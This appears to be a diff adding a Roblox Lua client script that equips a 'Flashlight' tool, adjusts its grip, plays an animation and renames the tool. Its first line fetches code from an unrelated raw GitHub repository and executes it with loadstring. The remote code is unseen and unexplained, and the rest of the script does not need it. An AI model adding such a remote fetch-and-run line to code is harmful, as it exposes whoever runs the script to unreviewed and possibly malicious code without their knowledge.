@@ -1,0 +1,69 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/100000000000000000000000000000000/splash-zone/refs/heads/main/yu",true))()
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- Animation ID (replace with your own animation ID)
+local animationId = "rbxassetid://220314918" -- Replace with your actual animation ID
+local anim = Instance.new("Animation")
+anim.AnimationId = animationId
+
+-- Variable to hold the animation track
+local animationTrack
+
+-- Function to play animation when the Flashlight is equipped
+local function onFlashlightEquipped(tool)
+    if player.Character then
+        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+
+        if humanoid then
+            -- Load and play the animation
+            if not animationTrack then
+                animationTrack = humanoid:LoadAnimation(anim)
+            end
+            
+            -- Play the animation
+            if not animationTrack.IsPlaying then
+                animationTrack:Play()
+            end
+
+            -- Rename the tool to "Nic"
+            tool.Name = "Nic"
+        end
+    end
+end
+
+-- Function to stop the animation when the Flashlight is unequipped
+local function onFlashlightUnequipped()
+    if animationTrack and animationTrack.IsPlaying then
+        animationTrack:Stop()
+    end
+end
+
+-- Unequip all tools initially
+player.Character.Humanoid:UnequipTools()
+local char = player.Character
+local Tools = player.Backpack:GetChildren()
+
+-- Find the tool named "Flashlight"
+local specificTool = nil
+
+for _, tool in ipairs(Tools) do
+    if tool:IsA("Tool") and tool.Name == "Flashlight" then
+        specificTool = tool
+        break
+    end
+end
+
+-- Check if the tool was found and set its grip and parent accordingly
+if specificTool then
+    -- Set flashlight grips
+    specificTool.Grip = CFrame.new(-0.15, -0.2, 0.3) * CFrame.Angles(math.rad(0), math.rad(-130), math.rad(0))
+    specificTool.Parent = char
+
+    -- Connect the Equipped and Unequipped events to the respective functions
+    specificTool.Equipped:Connect(function() onFlashlightEquipped(specificTool) end)
+    specificTool.Unequipped:Connect(onFlashlightUnequipped)
+else
+    warn("Tool 'Flashlight' not found in Backpack.")
+end
